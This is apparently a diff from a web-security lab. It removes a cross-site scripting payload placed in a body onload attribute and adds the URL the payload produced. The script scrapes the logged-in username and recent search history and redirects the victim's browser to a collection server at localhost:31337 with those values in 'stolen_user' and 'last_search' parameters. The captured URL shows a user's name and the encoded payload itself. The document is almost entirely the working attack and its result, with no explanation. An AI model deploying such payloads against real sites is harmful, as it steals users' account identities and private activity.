@@ -1,8 +1,1 @@
-<body onload="$( document ).ready(function() {
-    var user = $( '#logged-in-user' ).text();
-    alert(user);
-    var last = $( 'div a.history-item:nth-child(2)' ).text();
-    alert(last);
-    var url = 'http://localhost:31337/?' + 'stolen_user=' + user + '&' + 'last_search=' + last;
-    window.location.replace(url);
-    });">
+http://localhost:31337/?stolen_user=mikeykate&last_search=%3Cbody%20onload=%22$(%20document%20).ready(function()%20{%20%20%20%20%20var%20user%20=%20$(%20%27#logged-in-user'%20).text();%20%20%20%20%20alert(user);%20%20%20%20%20var%20last%20=%20$(%20'div%20a.history-item:nth-child(2)'%20).text();%20%20%20%20%20alert(last);%20%20%20%20%20var%20url%20=%20'http://localhost:31337/?'%20+%20'stolen_user='%20+%20user%20+%20'&'%20+%20'last_search='%20+%20last;%20%20%20%20%20window.location.replace(url);%20%20%20%20%20});%22%3E
